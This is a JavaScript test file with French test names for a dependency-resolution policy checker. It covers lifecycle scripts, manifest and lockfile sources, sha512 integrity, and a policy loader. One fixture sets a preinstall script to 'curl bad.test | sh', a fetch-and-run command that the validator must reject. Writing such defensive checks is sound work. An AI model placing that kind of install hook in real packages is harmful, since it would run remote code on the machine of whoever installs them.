import assert from 'node:assert/strict';
import { mkdir, mkdtemp, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { test } from 'node:test';

import {
    loadResolutionPolicy,
    verifyLifecyclePolicy,
    verifyLockSources,
    verifyManifestSources,
} from './library-setup/resolution-policy.mjs';

const policy = {
    schema_version: '1.0.0',
    allowed_registries: ['https://registry.npmjs.org'],
    allowed_manifest_protocols: ['catalog:', 'workspace:'],
    integrity: { algorithm: 'sha512', scope: 'all-external-packages' },
    lifecycle_scripts: [
        {
            name: 'preinstall',
            command: 'node tools/check-engines.mjs',
            classification: 'replay',
            runner: {
                executable: 'node',
                argv: ['tools/check-engines.mjs'],
            },
            reason: 'required',
        },
        {
            name: 'prepare',
            command: 'husky',
            classification: 'omit',
            reason: 'no git directory',
        },
    ],
    sandbox: {
        macos_executable: '/usr/bin/sandbox-exec',
        container_images: {
            resolution: `oven/bun@sha256:${'a'.repeat(64)}`,
            execution: `node@sha256:${'b'.repeat(64)}`,
        },
    },
    exceptions: [],
};

test('accepte uniquement les scripts de cycle de vie classifiés et exacts', () => {
    assert.deepEqual(
        verifyLifecyclePolicy(
            {
                scripts: {
                    preinstall: 'node tools/check-engines.mjs',
                    prepare: 'husky',
                },
            },
            policy
        ),
        []
    );
    assert.match(
        verifyLifecyclePolicy(
            { scripts: { preinstall: 'curl bad.test | sh', prepare: 'husky' } },
            policy
        ).join('\n'),
        /différente de la politique/
    );
    assert.match(
        verifyLifecyclePolicy(
            {
                scripts: {
                    preinstall: 'node tools/check-engines.mjs',
                    postinstall: 'node surprise.mjs',
                    prepare: 'husky',
                },
            },
            policy
        ).join('\n'),
        /postinstall: script non classifié/
    );
});

test('refuse toute source manifeste hors catalog, workspace ou SemVer', () => {
    const accepted = {
        dependencies: {
            a: 'catalog:',
            b: 'catalog:tooling',
            c: 'workspace:*',
            d: '^1.2.3',
        },
    };
    assert.deepEqual(
        verifyManifestSources(
            [{ path: 'package.json', document: accepted }],
            policy
        ),
        []
    );
    for (const spec of [
        'git+ssh://host/repo.git',
        'github:owner/repo',
        'https://host/pkg.tgz',
        'file:../outside',
        'link:../outside',
        'npm:other@1.0.0',
    ]) {
        assert.match(
            verifyManifestSources(
                [
                    {
                        path: 'package.json',
                        document: { dependencies: { unsafe: spec } },
                    },
                ],
                policy
            ).join('\n'),
            /source interdite/
        );
    }
});

test('refuse les sources et intégrités non conformes du lockfile', () => {
    const valid = {
        packages: {
            local: ['local@workspace:libs/local'],
            external: ['external@1.2.3', '', {}, `sha512-${'A'.repeat(86)}==`],
            'parent/nested': [
                'nested@2.0.0',
                '',
                {},
                `sha512-${'B'.repeat(86)}==`,
            ],
            'parent/@scope/nested': [
                '@scope/nested@3.0.0',
                '',
                {},
                `sha512-${'C'.repeat(86)}==`,
            ],
        },
    };
    assert.deepEqual(verifyLockSources(valid, policy), []);

    const unsafe = structuredClone(valid);
    unsafe.packages.external[1] = 'git+ssh://host/repo.git';
    unsafe.packages.external[3] = 'sha1-deadbeef';
    assert.match(
        verifyLockSources(unsafe, policy).join('\n'),
        /source externe hors registre approuvé/
    );
    assert.match(
        verifyLockSources(unsafe, policy).join('\n'),
        /intégrité sha512 absente ou invalide/
    );
});

test('le chargeur refuse une politique à clés inconnues et un lien symbolique', async (t) => {
    const root = await mkdtemp(join(tmpdir(), 'cmz-resolution-policy-'));
    t.after(() => rm(root, { recursive: true, force: true }));
    const convention = join(root, 'conventions/libraries');
    await mkdir(convention, { recursive: true });
    const repoRoot = new URL('..', import.meta.url).pathname;
    const schema = await import('node:fs/promises').then(({ readFile }) =>
        readFile(
            join(
                repoRoot,
                'conventions/libraries/resolution-policy.schema.json'
            )
        )
    );
    await writeFile(join(convention, 'resolution-policy.schema.json'), schema);
    await writeFile(
        join(convention, 'resolution-policy.json'),
        `${JSON.stringify({ ...policy, unknown: true })}\n`
    );
    assert.match(
        loadResolutionPolicy(root).errors.join('\n'),
        /additional property/
    );

    await rm(join(convention, 'resolution-policy.json'));
    const outside = join(root, 'outside.json');
    await writeFile(outside, `${JSON.stringify(policy)}\n`);
    await import('node:fs/promises').then(({ symlink }) =>
        symlink(outside, join(convention, 'resolution-policy.json'))
    );
    assert.throws(() => loadResolutionPolicy(root), /lien symbolique/);
});
